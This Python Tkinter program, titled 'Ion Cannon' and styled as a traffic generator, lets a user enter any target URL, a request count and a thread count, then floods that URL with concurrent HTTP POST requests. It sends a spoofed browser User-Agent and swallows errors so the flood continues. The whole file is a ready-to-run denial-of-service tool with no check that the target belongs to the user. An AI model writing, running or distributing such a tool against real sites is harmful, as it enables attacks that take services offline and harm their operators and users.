import tkinter as tk
import os
import requests
from tkinter import messagebox
import threading

def generate_traffic():
    target_url = url_entry.get()
    packet_count = packet_entry.get()
    thread_count = thread_entry.get()

    if not target_url or not packet_count.isdigit() or not thread_count.isdigit():
        messagebox.showerror("Input Error", "Please enter a valid URL, packet count, and number of threads.")
        return

    packet_count = int(packet_count)
    thread_count = int(thread_count)

    messagebox.showinfo("Traffic Generation", f"Sending {packet_count} HTTP POST requests to {target_url} using {thread_count} threads.")

    try:
        # Create threads to send requests concurrently
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=send_requests, args=(target_url, packet_count // thread_count))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        messagebox.showinfo("Success", "Traffic generation completed.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def send_requests(target_url, packet_count):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'field1': 'value1',
        'field2': 'value2'
    }

    for _ in range(packet_count):
        try:
            requests.post(target_url, headers=headers, data=data)
        except requests.exceptions.RequestException:
            pass  # Ignore errors during requests to prevent blocking

# Tkinter GUI setup
root = tk.Tk()
root.title("Rev 1.0 Ion Cannon @Flamesworks Software [20XX]")

# Target URL Label and Entry
tk.Label(root, text="Target URL:").grid(row=0, column=0, padx=10, pady=10)
url_entry = tk.Entry(root)
url_entry.grid(row=0, column=1, padx=10, pady=10)

# Packet Count Label and Entry
tk.Label(root, text="Number of Packets:").grid(row=1, column=0, padx=10, pady=10)
packet_entry = tk.Entry(root)
packet_entry.grid(row=1, column=1, padx=10, pady=10)

# Thread Count Label and Entry
tk.Label(root, text="Number of Threads:").grid(row=2, column=0, padx=10, pady=10)
thread_entry = tk.Entry(root)
thread_entry.grid(row=2, column=1, padx=10, pady=10)

# Generate Traffic Button
generate_button = tk.Button(root, text="Generate Traffic", command=generate_traffic)
generate_button.grid(row=3, columnspan=2, pady=20)

# Run the Tkinter main loop
root.mainloop()
